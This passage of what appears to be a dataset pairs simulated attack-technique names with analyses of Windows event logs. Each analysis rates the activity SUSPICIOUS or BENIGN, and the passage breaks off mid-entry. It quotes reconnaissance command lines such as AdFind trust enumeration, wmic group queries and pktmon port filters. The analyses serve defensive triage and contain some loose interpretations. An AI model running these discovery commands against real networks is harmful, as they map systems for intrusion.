2. **Audit Logs and Assessment**: Conduct a full security audit, including reviewing configurations and active network connections.
3. **Incident Response**: Activate your organization's incident response protocol to further investigate the potential breach or malicious intent. Consider isolating the affected machine until the threat level can be thoroughly assessed.
4. **Patching and Updating**: Ensure that all systems and applications are up-to-date against vulnerabilities exploited via scripting and privilege escalation.
5. **Monitoring and Alerts**: Enhance monitoring systems to catch future anomalies early, leveraging SIEM for behavioral analysis and suspicious pattern detection."
Adfind - Enumerate Active Directory Subnet Objects,"**Analysis of the Logs:**

**Application Log:**
- Windows Defender shows consistent security product state as ""SECURITY_PRODUCT_STATE_ON,"" indicating it is active and functional.

**Sysmon Log:**
- **wuauclt.exe** is also a legitimate Microsoft process used for updating Windows systems.
- **AM_Delta.exe** is part of anti-malware updates for Windows Defender.
- Instances of **powershell.exe**, **conhost.exe**, and **wevtutil.exe** associated with the user ""SERVER002\admin_test"" appear. PowerShell and command-line utilities with admin privileges can sometimes indicate suspicious activity if not conducted by a known schedule or user.
- **AdFind.exe** usage with command-line execution is potentially suspicious. AdFind is a legitimate LDAP enumeration tool often used for Active Directory enumeration, which can be exploited in lateral movement by malicious actors.

**Security Log:**
- Event ID 4624 indicates account logon attempts. Multiple SYSTEM-level logins are expected during normal operations.
- Event ID 4672 shows special privileges being assigned to the SYSTEM account, which is typical for service accounts or privileged processes.
- Multiple Event ID 5379, indicating credential submission events with a return code of 3221226021 suggest credential validation failure but repeated attempts, which might indicate an automated process or misconfiguration.

**System Log:**
- The update of Security Intelligence for Microsoft Defender Antivirus suggests this system is up to date with definitions for defense against known threats.

**Assessment:**
- The overall presence of legitimate system processes such as wuauclt.exe, svchost.exe, MpSigStub.exe, and update events are typical of regular update and maintenance activities.
- The use of PowerShell, wevtutil, and conhost might raise concern if they were initiated by unknown sources or at irregular times.
- The use of AdFind raises a flag for potential Active Directory reconnaissance.

**Resolution: SUSPICIOUS**

Further investigation is warranted, particularly around the use of AdFind and its command-line execution. Verify whether these actions were authorized and performed by legitimate admins or processes. Ensure that PowerShell and other command utilities were used for known and documented administrative tasks. Additionally, review user activity reporting or system tasks scheduled around this time to confirm legitimacy. It may also be wise to cross-reference logs with any incident or anomaly detection tools you have in place."
Wmic Group Discovery,"To analyze the provided Windows event logs, let's outline the main events and determine if there's any suspicious or malicious behavior present.

### Application Log:
- The log references an entry related to the Software Protection Platform Service. Such logs are common and typically relate to software licensing and protection. No suspicious activity is identified here.

### Sysmon Log:
The Sysmon logs capture detailed system events, including process creation and termination.

1. **HOSTNAME.EXE and CONHOST.EXE Activity:**
   - Frequent execution of `hostname.exe` and `conhost.exe` is observed. Both are legitimate system processes.
   - `hostname.exe` is used to display the hostname of the machine.
   - `conhost.exe` is often a child process for command-line activities.

2. **WHOAMI.EXE and Command Line Usage:**
   - `whoami.exe` was executed, which is used to get user information. This is a benign action but could be suspicious based on the context or frequency.
   - `cmd.exe` executed `wmic group get name`, which retrieves group information. WMIC (Windows Management Instrumentation Command-line) usage is legitimate but can sometimes be used for malicious reconnaissance.

3. **Repeated Usage of `wevtutil.exe`:**
   - Multiple instances of `wevtutil.exe` (a utility to manage Windows event logs) are executed. This can be indicative of log tampering or exploration by an attacker, especially if executed in rapid succession. However, it may also be used by system administrators for legitimate management tasks.

4. **Process Execution Integrity:**
   - All processes are executed under the `SERVER002\\admin_test` account with high integrity levels. There are no unknown or unexpected executables observed.

5. **Time Discrepancy Events:**
   - A discrepancy in time changes was noted (events where the system time was changed). This is unusual and potentially suspicious, as attackers may alter system time to evade detection or anti-forensic purposes.

### System and Security Logs:
- Several kernel and security events related to time change adjustments are logged. The time is adjusted in a narrow window (from 2024-10-23 12:54:01 to 12:54:14), and back, which can be either due to network time adjustments or potentially suspicious activity.

### Assessment:
- **Indicators of Suspicion:**
  - The frequent use of `wmic` and `wevtutil.exe` alongside repeated small time adjustments raises suspicion. These are often legitimate but can be used in malicious activities.
  - Additionally, the presence of legitimate command-line uses like `wmic` under an administrator account calls for further validation, especially in a high-risk environment.

### Recommendation:
- **Resolution: SUSPICIOUS**
  - Due to the use of `wevtutil.exe` and `wmic`, combined with time adjustments, it appears the logs contain activity indicating potential reconnaissance or log clearing intentions. However, there is no definitive evidence of malicious software or activity in this context.

### Guidance:
1. Conduct further investigation by reviewing user activity logs related to the `admin_test` account for anything unexpected.
2. Check historical logs for changes in the time settings to rule out periodic time adjustments or configuration errors.
3. Validate scheduled tasks or administrative scripts that may use `wevtutil.exe` and `wmic`.
4. Consider employing endpoint detection and response tools to monitor and alert on such activities in real-time for quick response measures.

This cautious approach ensures that potentially malicious activities are identified accurately and intervened timely."
Remote System Discovery - ping sweep,"Upon reviewing the provided Windows event logs, several patterns and events stand out which suggest a detailed analysis. Here is the breakdown of key observations:

1. **Application and System Logs**:
   - The logs mainly indicate routine Windows Defender operations and system update activities.
   - The presence of Windows Update Client and Windows Defender operations such as security intelligence updates (EventID: 44, 19) are typical and show the system is being regularly updated for security concerns.
   - Updated packages like Microsoft.VCLibs and CrossDevice indicate normal system maintenance and feature upgrades.

2. **Windows PowerShell Logs**:
   - PowerShell executions were logged, some using commands to write host outputs and others doing more involved operations like examining .inf files (looking for `[defaultinstall.nt(amd64|arm|arm64|x86)]` patterns). The command lines include permissions and the use of the `-ExecutionPolicy Restricted` flag.
   - No direct evidence of typical malicious PowerShell activities such as suspicious downloads, encoding, or obfuscation techniques.
   - The operations are executed with standard login contexts and seem aligned with tasks such as indexing or configuration assessments, common in system diagnostics or maintenance scripts.

3. **Sysmon Logs**:
   - The logs capture multiple instances of `ping.exe` being executed in a comprehensive scan of the 192.168.1.0/24 network. This activity involved systematically pinging a range of IP addresses.
   - The execution of commands using `cmd.exe` to perform network reconnaissance operations is notable and warrants further attention. This could indicate a benign network survey or an unauthorized reconnaissance activity.
   - The frequent and systematic ping attempts across the whole subnet might suggest scanning for active devices or services, a technique sometimes used in lateral movement or network mapping if unauthorized.

4. **Security Logs**:
   - The logs register typical audit success events such as logon instances (EventID: 4624) and privilege assignment (EventID: 4672) for user ""admin_test"", indicating usage of privileged accounts.
   - The consistent interactions and logons align with expected operations but should be verified against known scheduled tasks or administrator activities.
   - No direct indicators of failed login attempts or privilege escalation are present beyond the listed administrative privileges which might be normal for administrative operations.

**Assessment and Resolution**:
Based on the inspection of the logs, while there are activities such as network ping sweeps that might raise questions in specific contexts, there is insufficient evidence to assert definitively malicious intent. The logs show no clear signs of unauthorized access or breach activities like possession of suspicious executables, unexpected privilege escalations, or data exfiltration patterns.

**Resolution: SUSPICIOUS**: The extensive network ping sweep (likelihood of reconnaissance activity) and PowerShell scripts, while potentially benign, warrant further investigation to confirm their intended purpose and whether they align with authorized administrative tasks or user activities. Further investigation into the context of these network and PowerShell activities should be conducted by reaching out to the IT support staff or system administrators to verify the legitimacy of these operations. Additionally, monitoring future logs could help identify any deviation indicating potential threats."
Windows Internal pktmon set filter,"The provided Windows event logs require careful analysis to determine any signs of potential malicious activity or anomalies. Here is a breakdown of the logs and findings:

1. **Sysmon Logs:**
   - **Usage of `wevtutil.exe`:** The logs show multiple instances of `wevtutil.exe` being executed by the user `SERVER002\admin_test`. `wevtutil.exe` is a legitimate command-line utility for managing system logs. However, its usage can be suspicious if associated with unauthorized log clearing or similar activities. In this case, there’s no additional context to suggest malicious intent, but its frequent execution in quick succession is noteworthy.
   
   - **`cmd.exe` with network monitoring:** The execution of `cmd.exe` with the command-line `pktmon.exe filter add -p 445` indicates potential network monitoring or filtering set up for port 445. Port 445 is commonly used by SMB, and monitoring activities on this port can be legitimate but may also be indicative of pre-attack reconnaissance or data exfiltration attempts.
   
   - **High integrity level processes:** The events show several processes running with high integrity levels, such as `hostname.exe`, `whoami.exe`, `cmd.exe`, and `PktMon.exe`, executed by the `admin_test` user. These might indicate administrative tasks, but the context suggests this user runs commands that require scrutiny.

2. **System and Security Logs:**
   - **Time Manipulation Events (Event ID 4616):** Multiple occurrences of time adjustments indicate potential tampering with system time. This is particularly interesting because altering system time can be used to cover tracks by disrupting log file continuity or bypassing enforced time-based security controls.
   
   - **Service Host (svchost.exe) Usage:** General activity recorded in logs for `svchost.exe` appears legitimate for typical system operations handling various background services.
   
3. **General Observations:**
   - All the activities appear to be conducted by the user `SERVER002\admin_test`, who seems to have administrative privileges.
   - The context of activities, particularly the network monitoring setup and repeated `wevtutil.exe` executions, in conjunction with time adjustment events, suggest actions that go beyond typical administrative duties.

**Assessment and Resolution:**

- **There are potential indicators of anomalous behavior:**
  - The use `wevtutil.exe`.
  - Network monitoring set up on port 445.
  - Time changes suggesting tampering.

These factors necessitate further investigation to clarify the intent and legitimacy of these actions, especially considering the potential for them to be part of a larger malicious narrative.

- **Resolution: SUSPICIOUS**

Recommendations:
- Verify the legitimacy of actions taken by `admin_test`. Review permissions and recent changes to this account. 
- Investigate the necessity and authorization of network monitoring setup on port 445.
- Correlate these events with other security tools or logs to determine if there's a pattern indicative of a malicious campaign.
- If possible, conduct a full forensic investigation on the host to assess any additional malicious activities and secure the environment following company policies."
Discover System Language with dism.exe,"### Log Analysis

**System Log:**
- The system log shows several time change events associated with the process `svchost.exe`. The difference between the `OldTime` and `NewTime` is relatively small. Administrative services like `svchost.exe` performing time synchronization isn't inherently suspicious, especially since the time source is `time.windows.com`, a legitimate NTP server. 
- However, frequent time adjustments or modifications by unauthorized processes can sometimes be linked to malicious activity using timestomping techniques.

**Application Log:**
- The application logs show that the `edgeupdate` service stopped multiple times but does not indicate any failure or error. This alone isn't suspicious because `edgeupdate` is used for Microsoft Edge browser updates, which might involve stopping and starting services.

**Security Log:**
- Event ID `4672` indicates special privileges were assigned to the user `admin_test`, including `SeDebugPrivilege`, which could be misused for malicious activities. Special privileges are often granted to high-level accounts, but unusual privilege assignment without legitimate administrative purposes can be concerning.
- The logon from `admin_test` was over `NTLM` (Network Logon), which from a remote address (`fe80::e3b5:5371:12a8:9c77`) could suggest a remote session. If unexpected, this could raise a red flag.

**Sysmon Log:**
- Multiple `Sysmon` events show `wevtutil.exe` and `whoami.exe` executed by `admin_test`. `wevtutil.exe` is used to manage event logs, and execution of `whoami.exe` may indicate someone checking user permissions or context. 
- The execution of `dism.exe` (Deployment Image Servicing and Management tool) by `cmd.exe` might be normal for updates or configurations but may be a signature of certain lateral movement tactics.
- The frequent execution of `MicrosoftEdgeUpdate.exe` and associated processes can be part of a scheduled or triggered update cycle, not necessarily malicious, but it requires consideration of the context, like timing or excessive execution.

### Assessment

**-** Activities such as time changes, privilege assignments, and tool executions can be part of benign administrative tasks, updates, or maintenance processes. However, the context in which these actions happen, particularly remote logins and assignments of high privileges without adequate explanation, warrant further investigation.

**Resolution:** **SUSPICIOUS**

### Guidance on How to Proceed

1. **Verify User Activity:** Check with the system administrators to confirm if `admin_test` activities, including high privilege assignments and executions, align with expected tasks or scheduled updates.
2. **Perform User Audit:** Review the logs for regularity in `admin_test`'s logon times, and validate if the remote IP address is a known internal entity. 
3. **Time Change Analysis:** Investigate the necessity of time changes and affirm the legitimacy of services making these changes.
4. **Edge Update Process:** Ensure that the edge update processes align with expected update cycles or administrative tasks.
5. **Network Analysis:** Examine network logs for any unusual connections or data exfiltration attempts corresponding to remote logons.

If these investigations corroborate any anomalies or unauthorized access, escalate the situation to an incident response team for a more comprehensive probe into network traffic, process logs, and permission settings."
Adfind - Enumerate Active Directory Admins,"### Detailed Analysis of the Logs

The provided logs contain several Sysmon, application event, and security logs. The analysis focuses on identifying any potential indicators of malicious activity. Here's the breakdown:

#### Sysmon Logs:
- **Process Executions**:
  - **TiWorker.exe** and **TrustedInstaller.exe**: Both are legitimate Windows processes, typically involved with system updates and installations. Nothing malicious here.
  - **SecurityHealthService.exe (Windows Security Health Service)**: A legitimate process related to Windows security features.
  - **PowerShell.exe** and **conhost.exe**: Admin powershell execution by SERVER002\admin_test is suspicious without context but does not in itself indicate malicious activity. Needs more context.
  - **wevtutil.exe** and **conhost.exe**: The repeated execution of 'wevtutil.exe' can be suspicious as it's a command-line tool used for managing event logs, often used to clear logs which could hide malicious operations. Triggers potential investigation needs.
  - **AdFind.exe**: Detected via cmd.exe, a known tool for querying Active Directory. Its use could be indicative of data harvesting activities if not authorized.
  - **wsmprovhost.exe and hostname.exe**: Legitimate processes related to Windows Management Instrumentation and utility commands. While they can be used in lateral movements, they aren't inherently malicious.
  
#### Application Logs:
- **Windows Defender State**:
  - Windows Defender is reported as ""SECURITY_PRODUCT_STATE_ON"", indicating that the antivirus feature is active.

#### Security Logs:
- **Event ID 4624 (Logon) and 4672 (Special Privileges Assigned)**:
  - These entries indicate a successful logon for the SYSTEM user with administrative privileges. The elevated privileges (SeDebugPrivilege and others) granted are normal for system operations but if abused can lead to privilege escalations.

### Threat Assessment and Recommendations

- **Suspicions**:
  - The use of `wevtutil.exe` by a non-system account (`SERVER002\admin_test`) suggests a possible attempt to alter or clean event logs, which could be an attempt to cover tracks following some unauthorized or malicious activities.
  - The execution of `AdFind.exe` suggests possible reconnaissance or data harvesting that should be investigated further, especially its need or scheduling by `admin_test`.

Given these observations, while the detected activities may not conclusively confirm malicious intent, they align with suspicious patterns that warrant further investigation. The potential use of Windows administrative tools to manipulate logs and gather network information heightens the possibility.

### Resolution: 

**SUSPICIOUS**

### Guidance on How to Proceed:

1. **Validate User Activity**:
   - Confirm the legitimacy of the `admin_test` account activities, verifying with system administrators if these activities are routine or expected.
   
2. **Review Scheduled Actions**:
   - Inspect task scheduler and other automation tools for any indicators that `AdFind.exe` or `wevtutil.exe` use is sanctioned or recurring.
   
3. **Audit Event Logs**:
   - Check for any cleared logs or matching suspicious entries around these event times, identifying patterns or instructions in admin activity.
   
4. **Baseline Comparison**:
   - Compare with known baselines for the system operations to confirm deviations linked to typical system behavior.
   
5. **Access and Permission Review**:
   - Validate users with admin privileges have a legitimate need and discontinue if unauthorized access is detected.

Moving forward, maintaining heightened awareness and examining network traffic related to those processes can provide more context and ensure security postures are not breached."
Remote System Discovery - adidnsdump,"After thoroughly analyzing the provided Windows event logs, here is a detailed assessment of the situation:

### Key Observations:

1. **PowerShell Usage**:
   - There is an event in the PowerShell log (EventID 403) indicating a PowerShell script executed commands that potentially altered the environment by creating directories, downloading executables from the internet, specifically from Python's official website, and executing the installer.

2. **Command-Line Activity**:
   - There is a suspicious command-line argument noted in the Sysmon logs where `cmd.exe` was used to execute a script with `domain\user` and `password` arguments (`EventID 1`). This might suggest automation or script-driven tasks, but without context, it's difficult to determine legitimacy.

3. **Installation events**:
   - The Application logs indicate successful installations of Python and associated components like Add to Path, Tcl/Tk support, and pip. This seems to align with the PowerShell activity which downloaded and initiated an installation.

4. **Processes with Elevated Privileges**:
   - Several processes run under `NT AUTHORITY\SYSTEM`, including ones that might have been initiated by services or scheduled tasks, which is generally normal for system processes.

5. **Multiple Instances of Conhost.exe**:
   - Conhost.exe instances are often associated with command-line executions; however, their presence alone isn't inherently suspicious without accompanying malicious command lines or behaviors.

6. **Security Events**:
   - Security log entries show normal system activities like logon events and service starts under `NT AUTHORITY\SYSTEM`.

7. **Python Usage**:
   - Several logs indicate activity related to Python (installation, execution of scripts). While Python itself isn't malicious, its usage depends on the scripts executed.

8. **Potentially Malicious Indicators**:
   - Some alerts, like those involving cmd.exe with specific command-line arguments, raise red flags due to the use of what appears to be scripts with credentials in plaintext.

### Assessment and Resolution:

Based on the observations:

- **No direct malicious activities such as known malware signatures, indicators of privilege escalation beyond expected, or threatening system-level execution was identified**.
- **Presence of PowerShell downloads and installations needs contextual justification**. If these actions were unauthorized or unexpected, they could represent a potential risk.

Given this analysis, the activities in the logs can be considered **SUSPICIOUS**. Although not definitively malicious, they warrant further investigation to ensure legitimacy, especially regarding the PowerShell script execution and any persistent installation tasks or entries observed.

### Recommendations:

1. **Verify PowerShell Scripts**: Check if the PowerShell activities were carried out by authorized personnel or scripts. Confirm the legitimacy of the script that downloads and installs Python.

2. **Credential Safety**: Investigate the command-line usage involving credentials to ensure no sensitive information is at risk.

3. **Monitor for Unusual Behavior**: Continuously monitor for any unexpected or unauthorized changes in the system that could stem from the observed script activities.

4. **Review User Actions**: Verify the user ""SERVER002\\admin_test"" and associated activities to confirm they align with legitimate administrator tasks.

In conclusion, further investigation is needed to determine if these actions are part of an intended administrative activity or pose a security risk."
List Windows Firewall Rules,"**Log Analysis:**

Upon reviewing the provided Windows event logs, we can make the following observations:

1. **Frequent Execution of System Utilities:**
   - Multiple instances of `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe` are observed being executed by the user `SERVER002\admin_test`.
   - The use of commands like `whoami` and `cmd.exe` with parameters such as `netsh advfirewall firewall show rule name=all` suggests someone might be gathering system and network information, which can be a legitimate system administrative task. However, frequent use and especially in close succession can sometimes indicate script-based reconnaissance activity.

2. **Processes Running with High Integrity Level:**
   - These executions have a high integrity level, indicating that administrative privileges might be involved.
   - Consideration must be given to whether `SERVER002\admin_test` is a verified administrative account and whether the actions recorded are authorized.

3. **Execution Trace Patterns:**
   - The pattern of launching `conhost.exe` shortly after legitimate administrative utilities like `wevtutil.exe` and `HOSTNAME.EXE` can be typical for hosting and interfacing with console commands.
   - The activities are all executed under the same user context (`SERVER002\admin_test`), which can either be a system admin performing a batch of commands or an automated script operating within Admin privileges.

4. **Windows Update and Defender Operations:**
   - Several entries correspond to updates for Microsoft Defender Antivirus, which is a routine security patching process.
   - Activity involving `wuauclt.exe` and `MpSigStub.exe` appear to be part of the update mechanism, running under `NT AUTHORITY\SYSTEM`, hence normal on a Windows system.

5. **Credential Access Attempt Failures:**
   - Security logs showing EventID 5379 indicate failed credential operations, with repeated return codes for access denial. This type of event might suggest attempts to access or enumerate credential-related information without success.

**Threat/Risk Assessment:**

- **Potentially Benign:**
  - The observed activities seem consistent with typical administrative and update processes. They appear to be executed either by a legitimate administrative user or as part of a scripted task.
  - Updates being processed by Microsoft Defender and Windows Update are normal and expected behavior.

- **SUSPICIOUS Indicators:**
  - Repeated use of network and system information discovery tools by `admin_test` and the quick succession pattern may require verification if this aligns with known administrative tasks scheduled or performed manually by authoritative users.
  - The summary of failed credential operations might suggest unauthorized attempts or misconfigured scripts, requiring attention to correlate against known events or necessity.

**Resolution: SUSPICIOUS**

To ensure all action is above board:
- Confirm the identity and role of `SERVER002\admin_test` and correlate these events with legitimate administrative activities.
- Check if scheduled tasks or scripts that involve these command-line activities are in place.
- Review any unusual patterns or behaviors from this account historically.
- Inspect related configuration management policies and any audit logs for accurate correlation.
- Consider escalating to deeper threat hunting using more detailed telemetry tools if unauthorized access or actions are suspected following the initial review."
Win32_PnPEntity Hardware Inventory,"After a thorough analysis of the provided Windows event logs, here are the key observations and findings:

1. **Process Execution Patterns:**
   - Multiple instances of legitimate Windows processes such as `conhost.exe`, `whoami.exe`, `wevtutil.exe`, `MicrosoftEdgeUpdate.exe`, `hostname.exe`, and `svchost.exe` were observed. These processes are typically harmless when they adhere to standard operational practices.
   - The command line usage of these processes does not initially appear suspicious. For example, `conhost.exe` and `whoami.exe` are commonly used for console interactions and user information display, respectively.

2. **PowerShell Activity:**
   - There is PowerShell activity that involves data collection to a temporary directory, which can be a part of benign administrative tasks or automation scripts. The command involves `Get-WMIObject`, suggesting information gathering on Plug and Play entities.
   - The PowerShell script writes to a file `data_collection.txt`, sorts and filters data, and rewrites it. This behavior is often seen in automated scripts for data processing and does not directly indicate malicious activity.

3. **Scheduled Updates and System Tasks:**
   - The execution of `MicrosoftEdgeUpdate.exe` and processes under `C:\Program Files (x86)\Microsoft\EdgeUpdate\` suggest legitimate scheduled tasks for browser updates. These are typically benign unless associated with unexpected network activity or modified binaries.

4. **Time Synchronization:**
   - The system logs show time adjustments likely related to NTP (Network Time Protocol) activity, using a time server `time.windows.com`. Changes in time are normal for synchronization purposes but do not suggest malicious tampering or time-stomping in this context.

5. **Credentials and Privileges:**
   - Most processes are executed under the `SERVER002\admin_test` or `NT AUTHORITY\SYSTEM`, both of which are high-privilege accounts. While this is common in administrative environments, vigilance is advised for unauthorized use or privilege escalation attempts.
   - The high integrity level and use of common user accounts without indications of brute force or privilege escalation suggest no immediate compromise in credential usage.

6. **Network Service Activity:**
   - The presence of `svchost.exe` and `sppsvc.exe` running under various authority services is typical for managing network and licensing operations. Observed parameters and context do not indicate harmful actions.

**Assessment:**
- Based on the available logs and patterns, there are no significant indicators of malicious activity such as unauthorized privilege escalation, malicious payload execution, anomalous command lines, or unusual user behaviors.
- The observed behaviors align closely with legitimate administrative operations or routine system maintenance activities.

**Conclusion: BENIGN**
- The activities recorded in the event logs appear to be benign and do not require further investigation. However, continuous monitoring of such alerts is recommended to ensure they remain aligned with legitimate operations and no anomaly arises."
operating system discovery,"Upon reviewing the provided event logs across System, Windows PowerShell, Security, Sysmon, and Application channels, here's the analysis and findings:

**1. System Log Analysis:**
- The System log entries primarily focus on time changes, executed by the ""svchost.exe"" process for the time service. 
- Time synchronization and minor adjustments (EventID 24 and 1) are normal behavior for systems configured to correct time discrepancies.

**2. Windows PowerShell Log Analysis:**
- Multiple PowerShell provider startup events (EventID 600) are recorded. These logs indicate PowerShell sessions starting with information queries about the operating system.
- The command used involves fetching and selecting system information, which is a typical administrative task and doesn't immediately suggest malicious intent. However, if unauthorized, it could be indicative of reconnaissance activity.

**3. Security Log Analysis:**
- The Security log details a change in system time and shows that ""LOCAL SERVICE"" was involved, linking it to the time-setting activities seen in the System logs. 
- There are no clear signs of privilege escalation or other suspicious security events directly indicating compromise.

**4. Sysmon Log Analysis:**
- Several Sysmon events record activities primarily involving system utilities such as ""whoami.exe"" and ""conhost.exe"", used by ""admin_test"" user.
- The execution of ""whoami.exe"" and similar utilities points towards user context checks, common in either legitimate system management or audit activities. 
- `powershell.exe` execution corresponds to the PowerShell logs, indicating command execution under ""admin_test"" user in high integrity level, hinting at sufficient system privileges.

**5. Application Log Analysis:**
- Application log event record (EventID 16384) from ""Software Protection Platform Service"" appears routine and does not show signs of tampering or misconfiguration.

**Conclusion and Resolution:**
Overall, the logs show activity typical of system management and maintenance (e.g., time synchronization, administrative command execution). While there are various legitimate administrative activities, the absence of clearly malicious patterns (e.g., no abnormal privilege escalations, unsanctioned changes, or unfamiliar suspicious entries) means the logs do not strongly indicate malicious activity at this time.

**Resolution: BENIGN**

However, given the elevated privileges shown in PowerShell command execution, it is recommended to verify that such activities were sanctioned and initiated by authorized personnel. Regular monitoring and auditing will ensure continued security compliance and help in quickly identifying any future anomalies."
Adfind - Enumerate Active Directory Trusts,"Based on the provided event logs, here is a detailed analysis:

1. **Benign Activity:**
   - **Standard System Processes & Updates:** The logs include multiple entries for system processes like `TiWorker.exe`, `TrustedInstaller.exe`, `SecurityHealthService.exe`, and various Microsoft Edge Update events. These are standard processes related to Windows system maintenance and software updates.
   - **Windows Defender Active:** The application log confirms that Windows Defender is on, ensuring some level of antivirus protection is running.

2. **Suspicious Activity:**
   - **Command Line with AdFind.exe:** There is a command (`""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\AdFind.exe""  -gcb -sc trustdmp`) that stands out as potentially suspicious. `AdFind.exe` is a legitimate tool used for querying Active Directory, but it can be used for enumeration in a penetration testing activity or by malicious actors.
   - **Repeated Execution of `wevtutil.exe`:** The logs show repeated execution of `wevtutil.exe`, a command-line utility for retrieving information about event logs and publishers. When used frequently by an admin account like `admin_test`, it needs an explanation as it could indicate log tampering or reconnaissance.
   
3. **General Note:**
   - **Usage of High Integrity Processes:** Commands like `whoami.exe` and `HOSTNAME.EXE` run under `admin_test` at a high integrity level, which is typical for administration but should be confirmed if performed by a legitimate user as part of regular tasks.
   - **Privileges Granted:** The presence of events granting extensive privileges (`SeDebugPrivilege`, etc.) is expected for `SYSTEM` level processes. However, ensure no misuse occurs.

**Assessment:**
- The presence of `AdFind.exe` being executed along with commands that involve `sc trustdmp` operations is unusual unless approved for administrative or auditing purposes.
- `wevtutil.exe` usage should be clarified with the administrator to ensure it's routine and not an attempt to clear or alter logs.

**Resolution: SUSPICIOUS**

**Guidance:**
- Confirm with the system owner or administrator if the use of `AdFind.exe` and `wevtutil.exe` aligns with expected activities. Investigate the purpose behind these commands.
- Consider monitoring and possibly conducting endpoint detection for any unauthorized use of these tools or unexpected privilege escalation attempts.
- Ensure proper auditing of administrative activities and validate all administrative tool usage."
Remote System Discovery - nltest,"Upon reviewing the provided logs, here's a detailed analysis:

**Application Log:**
- The log indicates Windows Defender is operational. This is a standard and expected event.

**Security Log:**
- EventID 5379: A persistent series of events showing failed credential validation attempts for a Microsoft account (`MicrosoftAccount:user=02txoixylodcstop`). This could suggest brute force attempts or an issue with credential verification. ReturnCode `3221226021` indicates a failed authentication attempt.
- EventID 4624: A logon event for the SYSTEM account, which is normal for service accounts and not unusual by itself.
- EventID 4672: The SYSTEM account was granted special privileges such as `SeDebugPrivilege`. This is common for the SYSTEM account.

**Windows Update:**
- A series of successful update checks and installations for Windows Defender, which appear routine and part of regular system maintenance. 

**Sysmon Log:**
- Frequent executions of standard Windows utilities like `wevtutil.exe`, `hostname.exe`, `whoami.exe`, and others by the user `SERVER002\admin_test`. These command-line utilities are legitimate, though their frequent use may warrant checking if this is normal behavior for the specified user.
- The use of `nltest.exe` suggests potentially testing or querying for domain controllers which could be legitimate admin behavior, though in a WORKGROUP setting, this is less common and slightly suspicious.
- `cmd.exe` is executed to run a network test using `nltest.exe`, which might be typical for network diagnostics if performed by an administrator.
- Processes related to Windows Updates and typical system telemetry, such as `wuauclt.exe`, `MusNotification.exe`, and `CompatTelRunner.exe` are noted. These are standard Windows operations for updates and telemetry.

**Assessment:**
- **Suspicious Activity:** The repeated EventID 5379 entries are unusual and potentially suspicious. This may imply unauthorized attempts to access a system using a Microsoft account. However, such entries could also result from legitimate reasons, such as misconfigured Outlook/Office apps attempting to authenticate a user account that no longer exists.
- **Anomalous Command Usage:** The frequent use of system utilities by `SERVER002\admin_test` could indicate standard administrative tasks but warrants verification to ensure these actions align with the user's regular duties.
  
**Conclusion:**
The logs present **SUSPICIOUS** activity. The repeated failed authentication attempts (EventID 5379) should be further investigated to rule out any credential-based attack or misconfiguration. Additionally, the actions performed by the `SERVER002\admin_test` account should be validated to confirm that these align with typical administrative behavior.

**Guidance:**
- Investigate the source of the failed authentication attempts, possibly by checking other logs for the same time period or reaching out to the user for anomalies.
- Review the actions and role of the `SERVER002\admin_test` account to determine whether any executed commands or tools deviate from its expected usage patterns.
- Monitor for any other signs of credential misuse or unexpected access patterns.

Final Resolution: **SUSPICIOUS**. Further investigation is needed to confirm whether the observed activities are benign or indicative of an attempted security breach."
GetCurrent User with PowerShell Script,"Upon reviewing the provided Windows event logs, I have identified various activities that require further analysis to determine if they are benign, suspicious, or malicious.

**Detailed Analysis:**

1. **Security Log:**
   - **Event ID 4624 and 4672:** Indicates a successful login and special privileges being assigned to the SYSTEM account. This is expected behavior on a system and does not indicate malicious activity by itself.
   - **Event ID 5379:** Multiple instances attempting to read Microsoft account credentials with a ""ReturnCode"" indicating failure. While the repeated attempts can be concerning, they are unsuccessful and could be explained by failed background synchronization processes.

2. **System Log:**
   - Events show a size change in a registry hive, likely a log operation. Maintenance tasks, such as Windows Updates installing (Event IDs 44 and 43), are logged indicating regular system updates, which is benign activity.

3. **Windows PowerShell Log:**
   - PowerShell activity is logged with executions involving capturing the current user's identity into a file named ""CurrentUserObject.txt"". This behavior, especially being executed repeatedly, is not typical and could indicate reconnaissance or data gathering, which is suspicious.

4. **Sysmon Log:**
   - **Processes (wevtutil.exe, conhost.exe):** Regular Windows operations, such as listing events or terminal operations.
   - **Process (hostname.exe, whoami.exe):** Often used in network enumeration and user identification scripts. Seeing these executed could be normal for legitimate administrative tasks but, combined with other suspicious indicators (PowerShell behavior), it can be part of a potentially malicious script or an enumeration attempt by an attacker.
   - **MicrosoftEdgeUpdate.exe:** Activities involving Microsoft Edge updates, where installers and temp setup applications are executed, indicating typical software update behavior related to Microsoft Edge.
   
**Assessment:**

- From the logs, there is no definitive evidence of malicious activity. The PowerShell and enumeration processes (hostname, whoami) show non-standard behavior but do not include any malicious payloads or commands directly tied to compromise indicators. However, the combination of repeated identity gathering and enumeration hints at potentially suspicious activity if not verified as legitimate administrative tasks.

**Resolution:**

- **SUSPICIOUS**: The logs contain activities that need further investigation, especially validating the purpose of the PowerShell executions and the scripted enumeration nature of cmdlets like `hostname.exe` and `whoami.exe`. Ensure no scheduled tasks or admin scripts unintentionally mimic reconnaissance behavior.

**Guidance on How to Proceed:**

- Verify with relevant IT teams to confirm if these actions were conducted as part of legitimate administrative tasks or software provisions.
- Check for any unusual user behavior logs or access that might correlate with these events.
- Consider employing advanced threat detection and monitoring tools to capture additional context and track any deviations from the baseline normal behavior of the system.
- Strengthen internal controls around privileged account activities and PowerShell usage to prevent potential exploitation."
Adfind - Enumerate Active Directory Exchange AD Objects,"After reviewing the provided Windows event logs from the Security, Application, and Sysmon channels, here is the analysis:

### Key Observations:
1. **Repeated SYSTEM Logons (Security Log)**
   - Several EventID 4624 (An account was successfully logged on) with LogonType 5, which indicates a service logon. These originate from the same source (services.exe) and involve standard SYSTEM user activity for local services.
   - Privileged access (EventID 4672) follows these logons, granting privileges associated with SYSTEM accounts, such as SeDebugPrivilege. This is typical for service logons on a Windows system.

2. **Service Queries (Security Log - EventID 4798)**
   - Multiple user account group membership enumerations were observed. The events show typical system queries for group memberships (such as admin_test, Administrator) and don't indicate immediate malicious activity.

3. **Process Launch Activity (Sysmon Log)**
   - There are numerous process executions, including standard Windows processes like `taskhostw.exe`, `whoami.exe`, `hostname.exe`, which are normal in a Windows environment.
   - The execution of PowerShell (`powershell.exe`) and wevtutil (`wevtutil.exe`) by the user `admin_test` should be noted. While these are legitimate tools, they can be used for administrative or malicious purposes, particularly wevtutil, which can interact with event logs.

